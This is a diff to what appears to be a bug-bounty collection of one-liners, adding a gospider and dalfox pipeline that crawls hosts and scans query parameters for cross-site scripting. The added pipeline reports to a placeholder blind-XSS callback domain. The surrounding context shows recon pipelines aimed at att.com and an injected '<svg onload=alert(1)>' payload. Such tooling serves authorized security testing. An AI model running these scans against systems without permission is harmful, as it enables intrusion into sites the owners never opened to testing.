@@ -367,6 +367,14 @@ assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh 
 httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
 ```
 
+###  Scanning XSS with Gospider and Dalfox
+
+- [Explained command](https://bit.ly/3t9Y2Qh)
+
+```bash
+gospider -S httpx.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -b your_blind_xss_callback_domain | tee result.txt
+```
+
 ###  Grap internal juicy paths and do requests to them.
 
 - [Explained command](https://bit.ly/357b1IY)
